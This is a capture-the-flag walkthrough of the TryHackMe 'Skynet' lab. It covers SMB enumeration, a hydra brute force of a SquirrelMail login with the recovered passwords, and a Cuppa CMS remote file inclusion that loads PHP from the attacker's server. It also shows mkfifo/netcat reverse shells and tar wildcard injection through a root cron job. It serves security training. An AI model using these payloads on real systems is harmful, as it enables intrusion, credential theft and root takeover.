---
title: 'TryHackMe: Skynet'
created: '2020-09-10T19:14:42.546Z'
modified: '2020-09-11T19:26:58.742Z'
---

# TryHackMe: Skynet

## 1. What is Miles password for his emails?

### Enumeration
#### Summary
- Ports: `22,80,110,139,143, 445`
- Services: `Apache/2.4.18, IMAP4rev1, SMB, SSH`
- Computer name: `skynet`
- NetBIOS computer name: `SKYNET\x00`
- OS: `Ubuntu`
- Workgroup: `WORKGROUP`
- SMB Shares: `IPC, anonymous, milesdyson, print`

#### Nmap
```
kali@kali:~$ nmap -A 10.10.183.111
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-10 15:16 EDT
Nmap scan report for 10.10.183.111
Host is up (0.022s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: TOP AUTH-RESP-CODE SASL PIPELINING UIDL CAPA RESP-CODES
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: IMAP4rev1 post-login ID capabilities OK SASL-IR LOGIN-REFERRALS LOGINDISABLEDA0001 have listed Pre-login more LITERAL+ ENABLE IDLE
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: -1s
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2020-09-10T14:17:04-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-09-10T19:17:04
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.98 seconds

```

Gobuster
```
kali@kali:~$ gobuster dir --url http://10.10.183.111 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,xml,cfg -t 100
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.183.111
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     cfg,php,html,txt,xml
[+] Timeout:        10s
===============================================================
2020/09/10 15:24:44 Starting gobuster
===============================================================
/index.html (Status: 200)
/admin (Status: 301)
/css (Status: 301)
/js (Status: 301)
/config (Status: 301)
/ai (Status: 301)
/squirrelmail (Status: 301)
/server-status (Status: 403)
===============================================================
2020/09/10 15:32:41 Finished
===============================================================
```

### NMAP SMB Enumeration; need to get Samba shares.

```
kali@kali:~$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.183.111
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-10 15:42 EDT
Nmap scan report for 10.10.183.111
Host is up (0.016s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.183.111\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (skynet server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.183.111\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: Skynet Anonymous Share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\srv\samba
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.183.111\milesdyson: 
|     Type: STYPE_DISKTREE
|     Comment: Miles Dyson Personal Share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\milesdyson\share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.183.111\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
|_smb-enum-users: ERROR: Script execution failed (use -d to debug)

Nmap done: 1 IP address (1 host up) scanned in 4.26 seconds
```

### Access `anonymous` share; share allows anonymous `READ/WRITE` access.
```
kali@kali:~$ smbclient \\\\10.10.183.111\\anonymous\\
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep 18 00:41:20 2019
  ..                                  D        0  Tue Sep 17 03:20:17 2019
  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
  logs                                D        0  Wed Sep 18 00:42:16 2019
  books                               D        0  Wed Sep 18 00:40:06 2019

                9204224 blocks of size 1024. 5209156 blocks available
```

### Download files from `anonymous` share with `smbget -a -R`, anonymous, recursive.
```
kali@kali:~/Desktop/TryHackMe/skynet$ smbget -a -R smb://10.10.183.111/anonymous
Using workgroup WORKGROUP, guest user
smb://10.10.183.111/anonymous/attention.txt                                                                        
smb://10.10.183.111/anonymous/logs/log2.txt                                                                        
smb://10.10.183.111/anonymous/logs/log1.txt                                                                        
smb://10.10.183.111/anonymous/logs/log3.txt                                                                        
smb://10.10.183.111/anonymous/books/Introduction to Machine Learning with Python.pdf                               
smb://10.10.183.111/anonymous/books/What You Need to Know about Machine Learning.pdf                               
smb://10.10.183.111/anonymous/books/Thoughtful Machine Learning with Python.mobi                                   
...                                                         
Downloaded 447.25MB in 251 seconds

```

### `cat` the contents of the `.txt` files, they seem more interesting than the `.pdfs`

```
kali@kali:~/Desktop/TryHackMe/skynet$ ls
attention.txt  books  logs
kali@kali:~/Desktop/TryHackMe/skynet$ cat attention.txt 
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
kali@kali:~/Desktop/TryHackMe/skynet$ ls logs
log1.txt  log2.txt  log3.txt
kali@kali:~/Desktop/TryHackMe/skynet$ cat logs/log1.txt logs/log2.txt logs/log3.txt 
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```

### Now we have a potential password list `logs1.txt`, and potential username `milesdyson`, lets try access something; `squirrelmail` popped up in a our directory enumeration.

Used hydra to bruteforce the HTTP form. Note, the form submits to `redirect.php`, not to `login.php`.

```
kali@kali:~/Desktop/TryHackMe/skynet$ hydra -l milesdyson -P logs/log1.txt 10.10.121.225 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect." -I -V
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-10 17:31:26
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 31 login tries (l:1/p:31), ~2 tries per task
[DATA] attacking http-post-form://10.10.121.225:80/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect.
[ATTEMPT] target 10.10.121.225 - login "milesdyson" - pass "cyborg007haloterminator" - 1 of 31 [child 0] (0/0)
[ATTEMPT] target 10.10.121.225 - login "milesdyson" - pass "terminator22596" - 2 of 31 [child 1] (0/0)
[ATTEMPT] target 10.10.121.225 - login "milesdyson" - pass "terminator219" - 3 of 31 [child 2] (0/0)
[ATTEMPT] target 10.10.121.225 - login "milesdyson" - pass "terminator20" - 4 of 31 [child 3] (0/0)
[ATTEMPT] target 10.10.121.225 - login "milesdyson" - pass "terminator1989" - 5 of 31 [child 4] (0/0)
[ATTEMPT] target 10.10.121.225 - login "milesdyson" - pass "terminator1988" - 6 of 31 [child 5] (0/0)
[ATTEMPT] target 10.10.121.225 - login "milesdyson" - pass "terminator168" - 7 of 31 [child 6] (0/0)
[ATTEMPT] target 10.10.121.225 - login "milesdyson" - pass "terminator16" - 8 of 31 [child 7] (0/0)
[ATTEMPT] target 10.10.121.225 - login "milesdyson" - pass "terminator143" - 9 of 31 [child 8] (0/0)
[ATTEMPT] target 10.10.121.225 - login "milesdyson" - pass "terminator13" - 10 of 31 [child 9] (0/0)
[ATTEMPT] target 10.10.121.225 - login "milesdyson" - pass "terminator123!@#" - 11 of 31 [child 10] (0/0)
[ATTEMPT] target 10.10.121.225 - login "milesdyson" - pass "terminator1056" - 12 of 31 [child 11] (0/0)
[ATTEMPT] target 10.10.121.225 - login "milesdyson" - pass "terminator101" - 13 of 31 [child 12] (0/0)
[ATTEMPT] target 10.10.121.225 - login "milesdyson" - pass "terminator10" - 14 of 31 [child 13] (0/0)
[ATTEMPT] target 10.10.121.225 - login "milesdyson" - pass "terminator02" - 15 of 31 [child 14] (0/0)
[ATTEMPT] target 10.10.121.225 - login "milesdyson" - pass "terminator00" - 16 of 31 [child 15] (0/0)
[80][http-post-form] host: 10.10.121.225   login: milesdyson   password: cyborg007haloterminator
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-10 17:31:46

```

### Browse the email and pull any useful data

#### Pulled from emails..
- *Samba details*: milesdyson ``)s{A&2Z=F^n_E.B1` ``
- *Another account*: serenakogan@skynet

#### Binary from serenakogan
```
01100010 01100001 01101100 01101100 01110011 00100000 01101000 01100001 01110110
01100101 00100000 01111010 01100101 01110010 01101111 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111
```
Above converts to `balls have zero to me to me to me to me to me to me to me to me to`; reference to the Facebook AI polava with two chatbots.

### Login to milesdavis SMB with the recovered password

```
kali@kali:~$ smbclient \\\\10.10.121.225\\milesdyson --user=milesdyson
Enter WORKGROUP\milesdyson's password: 
Try "help" to get a list of possible commands.
smb: \> 
```

### Download all files milesdavis's SMB share
```
kali@kali:~/Desktop/TryHackMe/skynet$ smbget -R smb://10.10.121.225/milesdyson --user=milesdyson
Password for [milesdyson] connecting to //milesdyson/10.10.121.225: 
Using workgroup WORKGROUP, user milesdyson
smb://10.10.121.225/milesdyson/Improving Deep Neural Networks.pdf                                                                                                         
smb://10.10.121.225/milesdyson/Natural Language Processing-Building Sequence Models.pdf                                                                                   
smb://10.10.121.225/milesdyson/Convolutional Neural Networks-CNN.pdf                                                                                                      
smb://10.10.121.225/milesdyson/notes/3.01 Search.md                                                                                                                       
smb://10.10.121.225/milesdyson/notes/4.01 Agent-Based Models.md                                                                                                           
smb://10.10.121.225/milesdyson/notes/2.08 In Practice.md                                                                                                                  
smb://10.10.121.225/milesdyson/notes/0.00 Cover.md                                                                                                                        
smb://10.10.121.225/milesdyson/notes/1.02 Linear Algebra.md                                                                                                               
smb://10.10.121.225/milesdyson/notes/important.txt                                                                                                                        
smb://10.10.121.225/milesdyson/notes/6.01 pandas.md                                                                                                                       
smb://10.10.121.225/milesdyson/notes/3.00 Artificial Intelligence.md                                                                                                      
smb://10.10.121.225/milesdyson/notes/2.01 Overview.md                                                                                                                     
smb://10.10.121.225/milesdyson/notes/3.02 Planning.md                                                                                                                     
smb://10.10.121.225/milesdyson/notes/1.04 Probability.md                                                                                                                  
smb://10.10.121.225/milesdyson/notes/2.06 Natural Language Processing.md                                                                                                  
smb://10.10.121.225/milesdyson/notes/2.00 Machine Learning.md                                                                                                             
smb://10.10.121.225/milesdyson/notes/1.03 Calculus.md                                                                                                                     
smb://10.10.121.225/milesdyson/notes/3.03 Reinforcement Learning.md                                                                                                       
smb://10.10.121.225/milesdyson/notes/1.08 Probabilistic Graphical Models.md                                                                                               
smb://10.10.121.225/milesdyson/notes/1.06 Bayesian Statistics.md                                                                                                          
smb://10.10.121.225/milesdyson/notes/6.00 Appendices.md                                                                                                                   
smb://10.10.121.225/milesdyson/notes/1.01 Functions.md                                                                                                                    
smb://10.10.121.225/milesdyson/notes/2.03 Neural Nets.md                                                                                                                  
smb://10.10.121.225/milesdyson/notes/2.04 Model Selection.md                                                                                                              
smb://10.10.121.225/milesdyson/notes/2.02 Supervised Learning.md                                                                                                          
smb://10.10.121.225/milesdyson/notes/4.00 Simulation.md                                                                                                                   
smb://10.10.121.225/milesdyson/notes/3.05 In Practice.md                                                                                                                  
smb://10.10.121.225/milesdyson/notes/1.07 Graphs.md                                                                                                                       
smb://10.10.121.225/milesdyson/notes/2.07 Unsupervised Learning.md                                                                                                        
smb://10.10.121.225/milesdyson/notes/2.05 Bayesian Learning.md                                                                                                            
smb://10.10.121.225/milesdyson/notes/5.03 Anonymization.md                                                                                                                
smb://10.10.121.225/milesdyson/notes/5.01 Process.md                                                                                                                      
smb://10.10.121.225/milesdyson/notes/1.09 Optimization.md                                                                                                                 
smb://10.10.121.225/milesdyson/notes/1.05 Statistics.md                                                                                                                   
smb://10.10.121.225/milesdyson/notes/5.02 Visualization.md                                                                                                                
smb://10.10.121.225/milesdyson/notes/5.00 In Practice.md                                                                                                                  
smb://10.10.121.225/milesdyson/notes/4.02 Nonlinear Dynamics.md                                                                                                           
smb://10.10.121.225/milesdyson/notes/1.10 Algorithms.md                                                                                                                   
smb://10.10.121.225/milesdyson/notes/3.04 Filtering.md                                                                                                                    
smb://10.10.121.225/milesdyson/notes/1.00 Foundations.md                                                                                                                  
smb://10.10.121.225/milesdyson/Neural Networks and Deep Learning.pdf                                                                                                      
smb://10.10.121.225/milesdyson/Structuring your Machine Learning Project.pdf  
```
## 2. What is the hidden directory?

### Find interesting files..
```
kali@kali:~/Desktop/TryHackMe/skynet$ cd notes/
kali@kali:~/Desktop/TryHackMe/skynet/notes$ ls
'0.00 Cover.md'                '1.07 Graphs.md'                          '2.04 Model Selection.md'              '3.03 Reinforcement Learning.md'  '5.02 Visualization.md'
'1.00 Foundations.md'          '1.08 Probabilistic Graphical Models.md'  '2.05 Bayesian Learning.md'            '3.04 Filtering.md'               '5.03 Anonymization.md'
'1.01 Functions.md'            '1.09 Optimization.md'                    '2.06 Natural Language Processing.md'  '3.05 In Practice.md'             '6.00 Appendices.md'
'1.02 Linear Algebra.md'       '1.10 Algorithms.md'                      '2.07 Unsupervised Learning.md'        '4.00 Simulation.md'              '6.01 pandas.md'
'1.03 Calculus.md'             '2.00 Machine Learning.md'                '2.08 In Practice.md'                  '4.01 Agent-Based Models.md'       important.txt
'1.04 Probability.md'          '2.01 Overview.md'                        '3.00 Artificial Intelligence.md'      '4.02 Nonlinear Dynamics.md'
'1.05 Statistics.md'           '2.02 Supervised Learning.md'             '3.01 Search.md'                       '5.00 In Practice.md'
'1.06 Bayesian Statistics.md'  '2.03 Neural Nets.md'                     '3.02 Planning.md'                     '5.01 Process.md'

kali@kali:~/Desktop/TryHackMe/skynet/notes$ cat important.txt 

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

## 3. What is the vulnerability called when you can include a remote file for malicious purposes?


`remote file inclusion`

## 4. What is the user flag?

### Further enumerate the beta "cms" referred to earlier
```
kali@kali:~/Desktop/TryHackMe/skynet$ gobuster dir --url=http://10.10.121.225/45kra24zxs28v3yd/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.121.225/45kra24zxs28v3yd/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/10 18:47:33 Starting gobuster
===============================================================
/administrator (Status: 301)
Progress: 16059 / 220561 (7.28%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/09/10 18:48:02 Finished
===============================================================

```

### Navigate to the found /administrator file
We find "cuppaCMS". Miles, in his previous text file explains it needs works. Try the CuppaCMS default login detail.

`admin:admin`

This fails; and after attempting to brute in vain, I sought out an exploit. There is a known [RFI exploit for Cuppa CMS](https://www.exploit-db.com/exploits/25971). 

We exploit the above, and navigate to `http://10.10.121.225/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../etc/passwd`

And pull some system files. We can also execute shell code from another server.

So we create a Python server on Attacker machine.

Exploit with 
```
http://10.10.195.116/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.8.219:8000/shell.txt
```

Pull data with 
```

<?php
echo var_dump(shell_exec("ls /home/milesdyson"));
echo var_dump(shell_exec("cat /home/milesdyson/user.txt"));
echo var_dump(shell_exec("whoami"));
echo var_dump(shell_exec("ls -lah /home/milesdyson/"));
echo var_dump(shell_exec("cat /root/root.txt"));
echo var_dump(shell_exec("ls -lah /etc"));
echo var_dump(shell_exec("ls -lah /home"));
echo var_dump(shell_exec("cat ../Configuration.php"));

?>

```

## 5. What is the root flag?

### Make a persisted mkfifo reverse shell.

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.4.4 4444 >/tmp/f
```

### Run on web-browser after running metasploit listener
`http://10.10.231.188/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.8.219:8000/shell.php` 

This can be ran from your python server through the RFi vuln, using a php script containing:
```
<?php 

echo var_dump(
    shell_exec(
        "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.11.8.219 4444 
         > /tmp/f
"));

?>
```

```
kali@kali:~$ msfconsole
                                                  
# cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *


       =[ metasploit v5.0.101-dev                         ]
+ -- --=[ 2049 exploits - 1108 auxiliary - 344 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Save the current environment with the save command, future console restarts will use this environment again

[*] Starting persistent handler(s)...
msf5 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp

msf5 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.11.8.219      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.11.8.219:4444 
[*] Command shell session 3 opened (10.11.8.219:4444 -> 10.10.231.188:43392) at 2020-09-11 15:20:28 -0400
[*] 10.10.231.188 - Command shell session 3 closed.
[*] Command shell session 4 opened (10.11.8.219:4444 -> 10.10.231.188:43396) at 2020-09-11 15:21:22 -0400

ls
alertConfigField.php
alertIFrame.php
alertImage.php
defaultAlert.php
$ 

```

We now have a shell.

```
$ whoami
www-data
```

After some previous poking around with our RFI; I found that `crontab` runs `/home/milesdyson/backups/backup.sh` as root, every minute.

We could try inject the same "`nc` `mkfifo`" shell we're already using, in that shell script.


Note that the `backup.sh` file in `home/milesdyson/backups/` references some command `tar` _after_ `cd`ing to `/var/html/www`.

At first I considerered the possibility of exploiting PATH variables. But this would only persist for the current shell session. So instead, we need to exploit the usage of wildcards `*` in the tar statement.

We can "inject" exploitable flags into the `tar` command, which was something like `tar -cf something.tar *`, by adding files with names akin to the flags used by tar. 

If we create these files with, for example; 

```
touch "--checkpoint=1";
touch "--checkpoint-action=exec=sh exploit.sh";
```

When these files are included in the backup call to `/var/www/html`, they will be appended where the wild cards are:

`tar -cf something.tar file1.txt file2.txt --checkpoint=1 --checkpoint-action=exec=sh exploit.sh`

In effect, upon compressing arbitrary `file1` and `file2`, `checkpoint 1` is reached and thus `exec=sh exploit.sh` is fired. Of course we will need our reverse tcp shell code in the `exploit.sh` file.

We can just use netcat, with the mkfifo method we used earlier.

`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.4.4 4444 >/tmp/f" >> /var/www/html/exploit.sh `

And of course, listen for netcat connection on the attacker system. Note, if you miss the connection, it'll call every minute as the `crontab` is a fired every minute.

This will give you root. 

The root flag is in `/root/root.txt`.

